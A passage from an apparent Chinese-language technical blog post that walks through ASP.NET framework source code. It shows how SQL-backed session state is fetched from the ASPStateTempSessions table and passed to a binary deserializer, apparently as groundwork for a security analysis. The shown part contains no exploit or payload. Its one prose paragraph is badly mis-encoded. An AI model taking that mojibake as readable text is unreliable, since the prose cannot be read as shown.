                &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Parameters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DBNull&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;// @itemShort&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Parameters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DBNull&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;// @locked&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Parameters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DBNull&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;// @lockDate or @lockAge&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Parameters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DBNull&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;// @lockCookie&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Parameters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Convert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;DBNull&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;   &lt;span class=&quot;c1&quot;&gt;// @actionFlags&lt;/span&gt;

                &lt;span class=&quot;k&quot;&gt;using&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;SqlExecuteReaderWithRetry&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CommandBehavior&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Default&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                        &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                                &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
                            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                            &lt;span class=&quot;nf&quot;&gt;ThrowSqlConnectionException&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;cm&quot;&gt;/* Get short item */&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Parameters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

                &lt;span class=&quot;k&quot;&gt;using&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stream&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;MemoryStream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;item&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SessionStateUtility&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;DeserializeStoreData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s_configCompressionEnabled&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;_rqOrigStreamLen&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Position&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;item&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;finally&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;nf&quot;&gt;DisposeOrReuseConnection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;ref&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;conn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;usePooling&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        
        &lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;SqlStateConnection&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IDisposable&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;internal&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SqlCommand&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TempGet&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;get&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_cmdTempGet&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;_cmdTempGet&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;SqlCommand&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;dbo.TempGetStateItem3&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_sqlConnection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;_cmdTempGet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CommandType&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CommandType&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;StoredProcedure&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                        &lt;span class=&quot;n&quot;&gt;_cmdTempGet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CommandTimeout&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s_commandTimeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                        &lt;span class=&quot;c1&quot;&gt;// ignore process of setting parameters&lt;/span&gt;
                    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
                    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;_cmdTempGet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ÊàëÂÄëÂèØ‰ª•ÂæûÁ®ãÂºèÁ¢ºÊ∏ÖÊ•öÁúãÂá∫‰∏ªË¶ÅÊòØÂëºÂè´ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ASPState.dbo.TempGetStateItem3&lt;/code&gt; Stored Procedure ÂèñÂæó Session ÁöÑÂ∫èÂàóÂåñ‰∫åÈÄ≤Âà∂Ë≥áÊñô‰∏¶‰øùÂ≠òÂà∞ buf ËÆäÊï∏ÔºåÊúÄÂæåÂ∞á buf ÂÇ≥ÂÖ• &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SessionStateUtility.DeserializeStoreData&lt;/code&gt; ÈÄ≤Ë°åÂèçÂ∫èÂàóÂåñÈÇÑÂéüÂá∫ Session Áâ©‰ª∂ÔºåËÄå TempGetStateItem3 ÈÄôÂÄã SP ÂâáÊòØÁõ∏Áï∂ÊñºÂú®Âü∑Ë°å &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SELECT SessionItemShort FROM [ASPState].dbo.ASPStateTempSessions&lt;/code&gt;ÔºåÊâÄ‰ª•ÂèØ‰ª•Áü•ÈÅì Session ÊòØÂÑ≤Â≠òÂú® ASPStateTempSessions Ë≥áÊñôË°®ÁöÑ SessionItemShort Ê¨Ñ‰Ωç‰∏≠„ÄÇÊé•ËëóËÆìÊàëÂÄëÁπºÁ∫åÂæÄ‰∏ãÁúãÈóúÈçµÁöÑ DeserializeStoreData ÂÅö‰∫Ü‰ªÄÈ∫ºÊ®£ÁöÑÊìç‰Ωú„ÄÇÂêåÊ®£Âú∞ÔºåË°åÊï∏ÂÅèÂ§öÔºåÊúâÈúÄÊ±ÇÁöÑÊúãÂèãË´ãËá™Ë°å‰∏ãÊãâ XD&lt;/p&gt;

&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;namespace&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;System.Web.SessionState&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;SessionStateUtility&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;

        &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;SecurityPermission&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SecurityAction&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Assert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SerializationFormatter&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;internal&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SessionStateStoreData&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Deserialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HttpContext&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Stream&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;                 &lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;SessionStateItemCollection&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;sessionItems&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt;                &lt;span class=&quot;n&quot;&gt;hasItems&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;kt&quot;&gt;bool&lt;/span&gt;                &lt;span class=&quot;n&quot;&gt;hasStaticObjects&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;HttpStaticObjectsCollection&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;staticObjects&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;Byte&lt;/span&gt;                &lt;span class=&quot;n&quot;&gt;eof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

            &lt;span class=&quot;k&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;BinaryReader&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;BinaryReader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stream&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadInt32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;hasItems&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadBoolean&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
                &lt;span class=&quot;n&quot;&gt;hasStaticObjects&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadBoolean&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;

                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hasItems&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;sessionItems&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SessionStateItemCollection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Deserialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;sessionItems&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;SessionStateItemCollection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;hasStaticObjects&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;staticObjects&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;HttpStaticObjectsCollection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Deserialize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;n&quot;&gt;staticObjects&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SessionStateUtility&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetSessionStaticObjects&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;context&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

                &lt;span class=&quot;n&quot;&gt;eof&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;reader&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;ReadByte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;eof&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0xff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                    &lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;HttpException&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Invalid_session_state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
                &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EndOfStreamException&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;HttpException&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;GetString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Invalid_session_state&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
            &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;SessionStateStoreData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sessionItems&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;staticObjects&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;timeout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    
